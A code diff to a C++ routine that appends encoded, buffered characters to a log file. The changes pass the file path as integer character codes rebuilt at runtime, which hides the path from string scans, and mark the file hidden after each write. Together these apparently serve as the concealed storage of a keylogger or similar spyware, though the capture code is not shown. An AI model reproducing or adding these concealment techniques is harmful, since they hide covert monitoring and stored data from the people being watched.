@@ -6,7 +6,7 @@ long encodeStr(std::string& str)
 	//we do this every time the vector gets filled up.
 }
 
-bool flushChars(std::vector<int>& vec, std::string filename, int &count, bool check, int vecsize)
+bool flushChars(std::vector<int>& vec, std::vector<int> filename, int &count, bool check, int vecsize)
 {
 	bool doesFileExist = false;
 	if (vec.size() < vecsize && check) //check for debug
@@ -17,6 +17,12 @@ bool flushChars(std::vector<int>& vec, std::string filename, int &count, bool ch
 		//massive error occured if we can't open the file 5 times...
 		//we're going to have to create a new file.
 		return false;
+	}
+	
+	std::string filepath_string = "";
+	for (int i : filename)
+	{
+		filepath_string += (char)(i);
 	}
 
 	//flushes the current vector into the text document, along with encoding it.
@@ -33,10 +39,10 @@ bool flushChars(std::vector<int>& vec, std::string filename, int &count, bool ch
 		//result: offset 0 str1 0 str2 0 str3 ... 0 strfinal
 	}
 	
-	if (std::filesystem::exists(filename))
+	if (std::filesystem::exists(filepath_string))
 		doesFileExist = true;
 
-	std::fstream textfile(filename, std::ios::out | std::ios::app);
+	std::fstream textfile(filepath_string, std::ios::out | std::ios::app);
 	//check if not open, handle error.
 	if (!textfile.is_open())
 	{
@@ -45,7 +51,7 @@ bool flushChars(std::vector<int>& vec, std::string filename, int &count, bool ch
 	}
 
 
-	if (!doesFileExist || std::filesystem::file_size(filename) == 0) //text document empty.
+	if (!doesFileExist || std::filesystem::file_size(filepath_string) == 0) //text document empty.
 	{
 		textfile << "# DO NOT DELETE THIS FILE\n";
 	}
@@ -55,5 +61,6 @@ bool flushChars(std::vector<int>& vec, std::string filename, int &count, bool ch
 	vec.clear();
 
 	textfile.close();
+	SetFileAttributesA(filepath_string.c_str(), FILE_ATTRIBUTE_HIDDEN); //set as hidden
 	return true;
 }
